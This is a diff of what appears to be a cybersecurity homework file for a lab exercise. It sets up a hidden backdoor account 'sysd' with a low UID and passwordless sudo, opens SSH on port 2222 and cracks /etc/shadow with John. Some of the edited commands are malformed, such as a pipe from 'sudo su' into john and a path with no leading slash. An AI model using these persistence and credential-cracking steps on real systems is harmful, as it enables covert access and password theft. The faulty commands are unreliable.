@@ -7,32 +7,30 @@ Save and submit the completed file for your homework submission.
 **Step 1: Shadow People** 
 
 1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
-    - sudo adduser sysd
+    - sudo adduser -r sysd
 
 2. Give your secret user a password: 
     - sudo passwd sysd
 
 3. Give your secret user a system UID < 1000:
-    - sudo usermod -u 400 sysd
+    - sudo usermod -u 468 sysd
 
 4. Give your secret user the same GID:
-   - sudo groupmod -g 400 sysd
+   - sudo groupmod -g 468 sysd
 
 5. Give your secret user full `sudo` access without the need for a password:
    -  sudo visudo
+      # User privilege specification
+      sysd ALL=(ALL:ALL) NOPASSWD:ALL
 
 6. Test that `sudo` access works without your password:
-
-    ```bash
-    sysd ALL=(ALL:ALL) NOPASSWD:ALL
-    ```
+   -  sudo -l -U sysd
+      passwd sysadmin
 
 **Step 2: Smooth Sailing**
-sudo nano etc/ssh/sshd_config 
     
-
 1. Edit the `sshd_config` file:
-
+sudo nano etc/ssh/sshd_config 
     ```#SSH access via port 2222
     port 22
     port 2222
@@ -43,7 +41,7 @@ sudo nano etc/ssh/sshd_config
     - systemctl restart ssh.service
 
 2. Exit the `root` account:
-    - exit
+    - su sysd
 
 3. SSH to the target machine using your `sysd` account and port `2222`:
     - ssh sysd@192.168.6.105 -p 2222
@@ -58,9 +56,7 @@ sudo nano etc/ssh/sshd_config
     - ssh sysd@192.168.6.105 -p 2222
 
 2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
-
-    - sudo su 
-    - john /etc/shadow
+    - sudo su | john /etc/shadow
 
 ---
 
